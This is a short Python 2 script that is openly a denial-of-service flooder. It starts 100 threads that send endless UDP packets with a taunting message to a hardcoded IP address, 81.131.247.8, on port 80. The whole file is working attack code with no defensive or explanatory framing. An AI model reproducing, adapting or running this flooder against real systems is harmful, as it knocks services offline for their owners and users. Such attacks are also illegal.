import time, socket, os, sys, string, urllib2, threading
t = [None] *100
def attack():
	host = '81.131.247.8'
	port = 80
	message="#I am virtually kicking your ass. "
	ip = socket.gethostbyname( host )
	ddos = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	while True:
		try:
			ddos.connect((host, port))
		except socket.error, msg:
			print("failed to connect") 
			break
		for i in range(100):
			try:
				ddos.send( message )
				ddos.sendto( message, (ip, port) )
				ddos.send( message );
			except socket.error, msg:
				break
			except KeyboardInterrupt:
				break
	ddos.close()
	print "connection failed"


def main():
	print "DOS app started"
	while True:
		run = 1
		sys.stdout.write("\rAttacking target on port: 80                      "),
		sys.stdout.flush()
		for i in range(100):
			t[i] = threading.Thread(target=attack)
		for i in range(100):
			t[i].daemon = True
		for i in range(100):
			print "starting thread %s" %i
			t[i].start()
		for i in range(100):
			t[i].join()


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print "DDOS stopped"
